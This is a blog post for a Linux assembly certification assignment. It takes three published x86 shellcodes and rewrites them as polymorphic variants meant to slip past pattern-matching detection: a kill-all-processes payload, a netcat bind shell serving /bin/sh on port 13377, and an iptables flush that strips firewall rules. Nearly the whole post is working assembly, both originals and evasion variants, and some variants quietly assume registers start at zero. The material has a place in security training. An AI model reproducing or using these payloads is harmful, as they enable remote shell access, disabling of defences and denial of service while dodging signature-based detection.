# SLAE Assignment #6

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Assignment

* Take up 3 shellcodes from Shell-­‐Storm and create polymorphic versions of them to beat pattern matching
* The polymorphic versions cannot be larger 150% of the existing shellcode
* Bonus points for making it shorter in length than original

## Polymorphic Shellcode1

* Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-212.php
* Original Size: 11 bytes

Creating a file with the original shellcode:

```
; From: http://shell-storm.org/shellcode/files/shellcode-212.php
; Filename: shellcode1.nasm
; Author:  SLAE-935
;
; Purpose: execute kill(-1, SIGKILL)

section .text
    global _start
 
_start:
    ; kill(-1, SIGKILL);
    mov al, 37
    push byte -1
    pop ebx
    mov cl, 9
    int 0x80
```

Polymorphic version:

```
; Filename: shellcode1.poly.nasm
; Author:  SLAE-935
;
; Purpose: execute kill(-1, SIGKILL)

section .text
        global _start
 
_start:
        ; kill(-1, SIGKILL);
        add al, 37
        not ebx
        add cl, 9
        int 0x80
```

* New size: 9 bytes
* Dimension ratio: 75% of original

## Polymorphic Shellcode2

* Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-804.php
* Original Size: 64 bytes

Creating a file with the original shellcode:

```
; From: http://shell-storm.org/shellcode/files/shellcode-804.php
; Filename: shellcode2.nasm
; Author:  SLAE-935
;
; Purpose: This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker

section .text

    global _start
 
_start:
    xor eax,eax
    xor edx,edx
    push 0x37373333
    push 0x3170762d
    mov edx, esp
    push eax
    push 0x68732f6e
    push 0x69622f65
    push 0x76766c2d
    mov ecx,esp
    push eax
    push 0x636e2f2f
    push 0x2f2f2f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push edx
    push ecx
    push ebx
    xor edx,edx
    mov  ecx,esp
    mov al,11
    int 0x80
```

Polymorphic version:

```
; Filename: shellcode2.poly.nasm
; Author:  SLAE-935
;
; Purpose: This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker

section .text
    global _start
 
_start:
    shr eax, 16
    push 0x37373333
    push 0x3170762d
    push esp
    pop esi
    ;mov esi, esp
    push eax
    push 0x68732f6e
    push 0x69622f65
    push 0x76766c2d
    push esp
    pop edi
    push eax
    push 0x636e2f2f
    push 0x2f2f2f2f
    push 0x6e69622f
    push esp
    pop ebx
    push eax
    mov edx, eax
    push esi
    push edi
    push ebx
    push esp
    pop ecx
    add al,11
    int 0x80
```

* New size: 63 bytes
* Dimension ratio: 98% of original

## Polymorphic Shellcode3

* Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-825.php
* Original Size: 43 bytes

Creating a file with the original shellcode:

```
; From: http://shell-storm.org/shellcode/files/shellcode-825.php
; Filename: shellcode3.nasm
; Author:  SLAE-935
;
; Purpose: iptables --flush

section .text

    global _start
 
_start:
    xor eax, eax
    push eax
    push word 0x462d
    mov esi, esp
    push eax
    push 0x73656c62
    push 0x61747069
    push 0x2f6e6962
    push 0x732f2f2f
    mov ebx, esp
    push eax
    push esi
    push ebx
    mov ecx, esp
    mov edx, eax 
    mov al, 0xb
    int 0x80
```

Polymorphic version:

```
; Filename: shellcode3.poly.nasm
; Author:  SLAE-935
;
; Purpose: iptables --flush

section .text

    global _start
 
_start:
    shr eax, 16
    push eax
    push word 0x462d
    push esp
    pop esi
    push eax
    push 0x73656c62
    push 0x61747069
    push 0x2f6e6962
    push 0x732f2f2f
    push esp
    pop ebx
    push eax
    push esi
    push ebx
    mov ecx, esp
    shl edx, 16
    push byte 11
    pop eax
    int 0x80
```

* New size: 46 bytes
* Dimension ratio: 106% of original